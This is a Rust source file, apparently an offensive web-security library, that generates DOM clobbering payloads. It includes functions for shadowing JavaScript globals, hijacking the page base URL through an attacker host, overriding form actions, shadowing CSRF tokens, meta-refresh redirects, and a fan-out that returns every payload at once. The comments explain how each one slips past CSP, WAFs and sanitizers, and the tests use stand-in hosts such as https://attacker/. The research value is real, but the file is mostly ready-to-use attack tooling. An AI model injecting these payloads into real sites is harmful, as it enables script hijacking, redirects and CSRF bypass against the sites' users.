//! DOM clobbering payload library.
//!
//! DOM clobbering is the technique of using HTML elements (and their
//! `id` / `name` attributes) to OVERRIDE JavaScript globals on the
//! page. Because `<a id="config">` makes `window.config` and
//! `document.getElementById("config")` resolve to that element, an
//! attacker who controls an HTML fragment can subvert any script
//! that does:
//!
//! ```js
//! var url = window.config.url || "/default";
//! eval(window.config.script);
//! ```
//!
//! …without ever executing JavaScript. The XSS surface is HTML-only.
//! WAFs that pass HTML when no `<script>` tag is present routinely
//! miss this. Modern frameworks (Angular, React) have CSP rules that
//! block `<script>` but happily render `<form>` / `<a>` / `<img>`.
//!
//! This module emits the wire-format strings. The operator picks the
//! injection point (CMS field, user-controlled comment, file upload).
//!
//! Coverage:
//!
//! - **Single-element clobber**: one ID-bearing tag shadows one global.
//! - **HTMLCollection clobber**: two elements with the same `name` so
//!   `document.<name>` is a collection — accessing `.length` reveals
//!   the trick to detection scripts but `[0]` and `[1]` still work.
//! - **Nested clobber**: `window.config.url` — clobber `config` AND
//!   `config.url` with a chained `<a id="config" href="...">` so
//!   `window.config.url` resolves to the href string.
//! - **innerText shadowing**: legacy IE supported `<form name=X>` to
//!   override `window.X` AND `document.forms.X` simultaneously.
//! - **DOM Level 0 collections**: `document.forms`, `.images`,
//!   `.embeds`, `.applets`, `.links`, `.anchors` are auto-populated
//!   by tag — `<form name=X>` makes `document.forms.X` and
//!   `document.forms[N]`.
//! - **Form action override**: `<form id="x" action="javascript:..."`
//!   when other scripts use `document.getElementById("x").action`.
//! - **prototype-chain clobber**: many libraries use `someObject.constructor`
//!   — clobber via `<img name=constructor>`.
//!
//! References:
//! - Heyes / Beck "Clobbering DOM" PortSwigger research
//! - LiveOverflow "DOM Clobbering" series
//! - Klein "DOM clobbering: Attacks and the Mechanisms They Exploit"
//!   (USENIX Security 2023)

/// Build a single-element DOM-clobber payload that shadows
/// `window.<global>`.
///
/// Returns the HTML string to inject — a `<a>` tag whose `id` matches
/// the global name. The `href` becomes the shadow value: scripts that
/// read `window.<global>` get the element; scripts that read
/// `window.<global>.toString()` or `window.<global>+""` get the URL
/// string (browsers coerce `<a>` to its href in string contexts).
#[must_use]
pub fn shadow_global(global_name: &str, payload_href: &str) -> String {
    format!("<a id=\"{global_name}\" href=\"{payload_href}\">x</a>")
}

/// Build a `<form>`-based shadow (DOM Level 0 collections). `<form
/// name=X>` makes `document.forms.X` resolve to the form AND
/// `window.X` resolves to it. Action / target / enctype are
/// attacker-controlled.
#[must_use]
pub fn form_clobber(name: &str, action: &str) -> String {
    format!("<form name=\"{name}\" id=\"{name}\" action=\"{action}\"></form>")
}

/// Build an `<img name=X>` shadow. Image-collection trick: even when
/// the page CSP forbids `<script>`, images render. Renders an
/// invisible 1×1.
#[must_use]
pub fn img_clobber(name: &str) -> String {
    format!("<img name=\"{name}\" src=\"x\" style=\"display:none\">")
}

/// Nested DOM clobber for `window.X.Y`: chain an `<a>` whose `id` is
/// the outer name and a second tag whose `name` is the inner field.
/// Browsers resolve `window.X.Y` via the HTMLCollection-named-item
/// algorithm: it walks descendants of `X` looking for `name=Y`.
///
/// The classic prototype-pollution-via-DOM payload.
#[must_use]
pub fn nested_clobber(outer_id: &str, inner_name: &str, payload_href: &str) -> String {
    // `<form id="outer"><input name="inner" value="payload"></form>`
    // makes `window.outer.inner.value === "payload"`.
    // `<a id="outer"><a name="inner" href="payload">` makes
    // `window.outer.inner` resolve to the second <a> and `.href` works.
    format!(
        "<form id=\"{outer_id}\"><input id=\"{inner_name}\" name=\"{inner_name}\" \
         value=\"{payload_href}\"></form>"
    )
}

/// HTMLCollection clobber: two elements with the same `name`. Scripts
/// that do `if (target) { ... }` see truthy; scripts that iterate
/// the collection get both. Some libraries treat the collection as
/// an array and read `[0]`.
#[must_use]
pub fn collection_clobber(name: &str, value_a: &str, value_b: &str) -> String {
    format!(
        "<a id=\"{name}\" href=\"{value_a}\">a</a><a id=\"{name}\" href=\"{value_b}\">b</a>"
    )
}

/// `<base>` clobber: hijack the document's base URL so every
/// relative-href on the page resolves through an attacker host.
///
/// Lethal because every later `<script src="...">` (CDN, analytics)
/// becomes attacker-served. Many CSPs whitelist `'self'` for scripts
/// — `<base href="https://attacker">` makes "self-relative" mean
/// "attacker-served." Modern browsers cap this to the FIRST `<base>`
/// in the document.
#[must_use]
pub fn base_clobber(attacker_href: &str) -> String {
    format!("<base href=\"{attacker_href}\">")
}

/// `<input type=hidden>` clobber: shadow a form's
/// `document.forms.X.elements.Y` lookup. The original form may have
/// a CSRF-token field at `.elements.csrf_token`; injecting a
/// matching `<input name="csrf_token">` into a STRAY form with the
/// same `name` (or as the next element) can confuse `elements`
/// lookups across some browsers.
#[must_use]
pub fn hidden_input_clobber(form_name: &str, field_name: &str, value: &str) -> String {
    format!(
        "<form name=\"{form_name}\"><input type=\"hidden\" id=\"{field_name}\" \
         name=\"{field_name}\" value=\"{value}\"></form>"
    )
}

/// `<iframe name=X>` clobber. Frames are window-scope navigable;
/// `window.X` resolves to the contentWindow. With a `srcdoc`
/// attribute the operator controls the inner document's origin
/// (same-origin via about:srcdoc).
#[must_use]
pub fn iframe_clobber(name: &str, srcdoc: &str) -> String {
    // `srcdoc` content must be HTML-escaped at the call site.
    format!("<iframe name=\"{name}\" srcdoc=\"{srcdoc}\"></iframe>")
}

/// Shadow `document.title` and friends. Some scripts read
/// `document.title` as a privileged value — using `<title>` lets the
/// attacker control it. `<title>` is allowed in many sanitizers.
#[must_use]
pub fn title_clobber(attacker_title: &str) -> String {
    format!("<title>{attacker_title}</title>")
}

/// `<meta http-equiv="refresh">` clobber: redirect the page on load.
/// Many sanitizers strip script tags but allow `<meta>` because it's
/// "document metadata."
#[must_use]
pub fn meta_redirect(seconds: u32, target: &str) -> String {
    format!("<meta http-equiv=\"refresh\" content=\"{seconds};url={target}\">")
}

/// `prototype` chain clobber: shadow `someObject.constructor` via
/// `<img name=constructor>`. Useful against libraries that do
/// `if (obj.constructor.name === "Object") { ... }` for type guards.
#[must_use]
pub fn prototype_chain_clobber(prop: &str, payload: &str) -> String {
    format!("<img name=\"{prop}\" src=\"{payload}\">")
}

/// One-shot fan-out: every DOM-clobber primitive in this module, for
/// a single target global. Returns ~10 payloads.
#[must_use]
pub fn all_clobbers_for_global(global_name: &str, payload: &str) -> Vec<String> {
    vec![
        shadow_global(global_name, payload),
        form_clobber(global_name, payload),
        img_clobber(global_name),
        collection_clobber(global_name, payload, payload),
        base_clobber(payload),
        iframe_clobber(global_name, payload),
        title_clobber(payload),
        meta_redirect(0, payload),
        prototype_chain_clobber(global_name, payload),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shadow_global_has_id_attribute() {
        let p = shadow_global("config", "javascript:alert(1)");
        assert!(p.contains("id=\"config\""));
        assert!(p.contains("javascript:alert(1)"));
        assert!(p.starts_with("<a "));
    }

    #[test]
    fn form_clobber_includes_name_and_id() {
        let p = form_clobber("target", "https://attacker/");
        assert!(p.contains("name=\"target\""));
        assert!(p.contains("id=\"target\""));
        assert!(p.contains("action=\"https://attacker/\""));
    }

    #[test]
    fn img_clobber_hidden_by_default() {
        let p = img_clobber("global");
        assert!(p.contains("display:none"));
        assert!(p.contains("name=\"global\""));
    }

    #[test]
    fn nested_clobber_emits_form_with_inner_input() {
        let p = nested_clobber("config", "url", "https://attacker/");
        assert!(p.contains("<form id=\"config\""));
        assert!(p.contains("name=\"url\""));
        assert!(p.contains("value=\"https://attacker/\""));
    }

    #[test]
    fn collection_clobber_emits_two_elements() {
        let p = collection_clobber("group", "/a", "/b");
        // Two <a> tags with same id.
        assert_eq!(p.matches("id=\"group\"").count(), 2);
        assert!(p.contains("/a"));
        assert!(p.contains("/b"));
    }

    #[test]
    fn base_clobber_only_one_tag() {
        let p = base_clobber("https://attacker/");
        assert_eq!(p.matches("<base").count(), 1);
        assert!(p.contains("https://attacker/"));
    }

    #[test]
    fn hidden_input_clobber_wraps_in_form() {
        let p = hidden_input_clobber("loginForm", "csrf_token", "bypass");
        assert!(p.contains("<form name=\"loginForm\""));
        assert!(p.contains("name=\"csrf_token\""));
        assert!(p.contains("value=\"bypass\""));
        assert!(p.contains("type=\"hidden\""));
    }

    #[test]
    fn iframe_clobber_uses_srcdoc() {
        let p = iframe_clobber("victim", "<h1>evil</h1>");
        assert!(p.contains("<iframe"));
        assert!(p.contains("name=\"victim\""));
        assert!(p.contains("srcdoc="));
    }

    #[test]
    fn title_clobber_basic() {
        let p = title_clobber("Attacker");
        assert_eq!(p, "<title>Attacker</title>");
    }

    #[test]
    fn meta_redirect_seconds_and_target() {
        let p = meta_redirect(0, "https://attacker/");
        assert!(p.contains("http-equiv=\"refresh\""));
        assert!(p.contains("0;url=https://attacker/"));
    }

    #[test]
    fn prototype_chain_clobber_uses_img() {
        let p = prototype_chain_clobber("constructor", "/x");
        assert!(p.starts_with("<img"));
        assert!(p.contains("name=\"constructor\""));
    }

    #[test]
    fn all_clobbers_for_global_minimum_count() {
        let payloads = all_clobbers_for_global("config", "/x");
        assert!(payloads.len() >= 9, "got {}", payloads.len());
        // Every payload mentions the target global name.
        for p in &payloads {
            assert!(
                p.contains("config") || p.contains("/x"),
                "clobber doesn't reference target: {p}"
            );
        }
    }

    #[test]
    fn no_clobber_contains_script_tag() {
        // The whole point of DOM clobbering is to defeat CSP / WAF
        // filters that scan for `<script>`. If any of our payloads
        // smuggles a `<script>`, we've defeated our own purpose.
        let payloads = all_clobbers_for_global("X", "Y");
        for p in &payloads {
            assert!(
                !p.to_lowercase().contains("<script"),
                "payload contains <script>: {p}"
            );
        }
    }

    #[test]
    fn all_clobbers_are_unique() {
        let payloads = all_clobbers_for_global("X", "Y");
        let unique: std::collections::HashSet<&String> = payloads.iter().collect();
        assert_eq!(unique.len(), payloads.len(), "duplicates in clobber set");
    }

    #[test]
    fn deterministic() {
        let a = all_clobbers_for_global("X", "Y");
        let b = all_clobbers_for_global("X", "Y");
        assert_eq!(a, b);
    }

    #[test]
    fn handles_unicode_global_name() {
        // Unicode in attribute values isn't HTML-escaped by us — the
        // caller is responsible for escaping at the injection point.
        let p = shadow_global("Ñame", "/x");
        assert!(p.contains("Ñame"));
    }

    #[test]
    fn adversarial_long_inputs_no_panic() {
        let big = "a".repeat(10_000);
        let _ = shadow_global(&big, &big);
        let _ = nested_clobber(&big, &big, &big);
        let _ = all_clobbers_for_global(&big, &big);
    }

    #[test]
    fn primitives_are_well_formed_tag_open_close() {
        // Each primitive must produce balanced opening / closing.
        // (We don't enforce strict HTML validity — sanitizers will
        // tolerate the variants — but the tag must at least open
        // and close consistently.)
        let p = nested_clobber("a", "b", "c");
        assert!(p.starts_with("<form"));
        assert!(p.ends_with("</form>"));
        let q = form_clobber("a", "b");
        assert!(q.ends_with("</form>"));
    }
}
